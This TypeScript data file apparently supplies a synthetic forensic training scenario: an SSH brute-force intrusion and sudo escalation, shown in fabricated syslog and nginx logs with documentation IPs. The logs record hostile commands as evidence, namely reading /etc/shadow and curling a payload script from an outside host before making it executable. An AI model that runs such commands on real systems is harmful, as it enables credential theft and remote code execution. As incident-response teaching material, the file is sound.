/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { CaseMetadata, LogSource } from '../types';

export const SCENARIO_1_CASE: CaseMetadata = {
  id: 'case-2026-001',
  caseNumber: 'INC-2026-089',
  title: 'Operation Iron Bastion - SSH Brute Force & Privilege Escalation',
  investigator: 'SOC Analyst / Forensic Lead',
  referenceDate: '2026-10-09',
  description:
    'External brute-force intrusion vector originating from RFC 5737 documentation subnet (203.0.113.14). Resulted in credential stuffing on user "deploy" and subsequent interactive root shell escalation via sudo.',
  createdAtUtc: '2026-10-09T14:30:00.000Z',
  updatedAtUtc: '2026-10-09T16:45:00.000Z',
};

export const SCENARIO_1_SOURCES: LogSource[] = [
  {
    id: 'src-auth-01',
    name: 'Production Auth Log (syslog)',
    hostLabel: 'srv-prod-auth',
    format: 'rfc3164_syslog',
    timezone: 'America/New_York',
    clockOffsetSeconds: 180, // Server clock was 3 minutes fast
  },
  {
    id: 'src-web-01',
    name: 'Nginx Web Server Access',
    hostLabel: 'srv-prod-web',
    format: 'combined_log',
    timezone: 'UTC',
    clockOffsetSeconds: -60, // Server clock was 1 minute slow
  },
];

export const SCENARIO_1_AUTH_LOG = `Oct  9 08:35:10 srv-prod-auth systemd[1]: Started OpenSSH server daemon.
Oct  9 08:40:02 srv-prod-auth CRON[13401]: (root) CMD (/usr/local/bin/metrics-collector.sh >/dev/null 2>&1)
Oct  9 08:42:15 srv-prod-auth sshd[14102]: Invalid user admin from 203.0.113.14 port 43100
Oct  9 08:42:18 srv-prod-auth sshd[14102]: Failed password for invalid user admin from 203.0.113.14 port 43100 ssh2
Oct  9 08:42:25 srv-prod-auth sshd[14105]: Invalid user root from 203.0.113.14 port 43104
Oct  9 08:42:28 srv-prod-auth sshd[14105]: Failed password for invalid user root from 203.0.113.14 port 43104 ssh2
Oct  9 08:42:35 srv-prod-auth sshd[14108]: Invalid user test from 203.0.113.14 port 43110
Oct  9 08:42:39 srv-prod-auth sshd[14108]: Failed password for invalid user test from 203.0.113.14 port 43110 ssh2
Oct  9 08:42:48 srv-prod-auth sshd[14112]: Invalid user postgres from 203.0.113.14 port 43115
Oct  9 08:42:52 srv-prod-auth sshd[14112]: Failed password for invalid user postgres from 203.0.113.14 port 43115 ssh2
### MALFORMED RAW BUFFER DUMP -- KERNEL CORRUPTED PACKET 0x7FA3B00 -- ###
Oct  9 08:43:05 srv-prod-auth sshd[14118]: Failed password for deploy from 203.0.113.14 port 43120 ssh2
Oct  9 08:43:18 srv-prod-auth sshd[14122]: Failed password for deploy from 203.0.113.14 port 43124 ssh2
Oct  9 08:43:30 srv-prod-auth sshd[14125]: Accepted password for deploy from 203.0.113.14 port 43128 ssh2
Oct  9 08:43:30 srv-prod-auth sshd[14125]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
Oct  9 08:44:02 srv-prod-auth sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
Oct  9 08:44:02 srv-prod-auth sudo: pam_unix(sudo:session): session opened for user root by deploy(uid=1001)
Oct  9 08:45:12 srv-prod-auth sudo:   deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/shadow
Oct  9 08:46:20 srv-prod-auth sudo:   deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/payload.sh http://203.0.113.88/drop.sh
Oct  9 08:46:50 srv-prod-auth sudo:   deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod +x /tmp/payload.sh
--- SYSLOG DAEMON FLUSH HEADER FAILURE --- NO TIMESTAMP FIELD ---
Oct  9 08:48:15 srv-prod-auth sshd[14125]: pam_unix(sshd:session): session closed for user deploy
Oct  9 08:50:00 srv-prod-auth CRON[14250]: (root) CMD (/usr/local/bin/metrics-collector.sh >/dev/null 2>&1)`;

export const SCENARIO_1_WEB_LOG = `203.0.113.14 - - [09/Oct/2026:08:30:12 +0000] "GET / HTTP/1.1" 200 4820 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
203.0.113.14 - - [09/Oct/2026:08:31:05 +0000] "GET /robots.txt HTTP/1.1" 200 154 "-" "curl/7.88.1"
203.0.113.14 - - [09/Oct/2026:08:32:19 +0000] "GET /.env HTTP/1.1" 404 162 "-" "curl/7.88.1"
203.0.113.14 - - [09/Oct/2026:08:32:44 +0000] "GET /wp-login.php HTTP/1.1" 404 162 "-" "Mozilla/5.0"
203.0.113.14 - - [09/Oct/2026:08:33:12 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 162 "-" "Mozilla/5.0"
203.0.113.14 - - [09/Oct/2026:08:34:01 +0000] "GET /api/v1/health HTTP/1.1" 200 45 "-" "curl/7.88.1"
203.0.113.14 - admin [09/Oct/2026:08:34:40 +0000] "POST /api/v1/auth HTTP/1.1" 401 89 "-" "curl/7.88.1"
203.0.113.14 - test [09/Oct/2026:08:35:02 +0000] "POST /api/v1/auth HTTP/1.1" 401 89 "-" "curl/7.88.1"
198.51.100.22 - - [09/Oct/2026:08:36:15 +0000] "GET /dashboard HTTP/1.1" 200 8920 "https://company.org" "Mozilla/5.0"
203.0.113.14 - - [09/Oct/2026:08:38:00 +0000] "GET /config.json HTTP/1.1" 403 189 "-" "curl/7.88.1"
UNRECOGNIZED_TRANSMISSION_FRAME_CRC_ERROR_FF89
198.51.100.22 - - [09/Oct/2026:08:40:22 +0000] "GET /api/v1/users HTTP/1.1" 200 1204 "https://company.org" "Mozilla/5.0"
203.0.113.88 - - [09/Oct/2026:08:47:01 +0000] "GET /drop.sh HTTP/1.1" 200 1420 "-" "curl/7.68.0"`;
